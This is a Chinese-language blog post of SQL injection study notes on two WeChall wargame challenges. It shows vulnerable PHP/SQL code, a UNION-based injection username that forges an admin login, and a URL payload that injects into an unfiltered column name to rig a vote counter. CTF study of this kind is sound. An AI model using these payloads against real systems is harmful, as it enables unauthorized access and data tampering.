---
layout: post
title: "sqli-studying3"
date: 2019-05-16
author: jjnoob
categories:
- 2019-05
tags:
- sqli
---

* content
{:toc}


> 看代码, 理解题目意思, 看writeup, 积累.


# 一. Wechall - MySQL 2
源码:
```php

$db = auth2_db();
	
$password = md5($password);
	
$query = "SELECT * FROM users WHERE username='$username'";
	
if (false === ($result = $db->queryFirst($query))) {
    echo GWF_HTML::error('Auth2', $chall->lang('err_unknown'), false);
    return false;
}
	
	
#############################
### This is the new check ###
if ($result['password'] !== $password) {
	echo GWF_HTML::error('Auth2', $chall->lang('err_password'), false);
	return false;
} #  End of the new code  ###
#############################
```

拿Username去获取结果, 将获得的password与输入的password的md5值进行比较

Username:
```sql
' union select 1, 'admin', 'c4ca4238a0b923820dcc509a6f75849b'# 
```

Password=:
```sql
1
```

其中`md5(1) == c4ca4238a0b923820dcc509a6f75849b`

<br />

# 二. Wechall - No Escape 


## (1) 源码
[题目源码地址](http://www.wechall.net/challenge/no_escape/code.include)

### 按模块来看
1. 连接数据库的函数
2. 创建数据库的函数
3. 重置函数, 将票数置为初始值
4. 主题判断函数
5. 票数增一函数
6. stop100()函数, 如果票数为111则执行solved(), 如果票数为100则重置
7. html表单
8. solved()函数

### 按流程来看
1. 点击vote按钮后, 调用noesc_voteup()
2. noesc_voteup()中, 执行update操作后, 调用noesc_stop100()
3. noesc_stop100(), 先检查票数是否为111, 若是则通过. 接着检查票数是否大于等于100, 若是则清零.

### 解题
源码中的关键
```sql
$query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
```

`$who`没有经过任何过滤.

构造:
```php
index.php?vote_for=bill`=111-- `
```
即可.

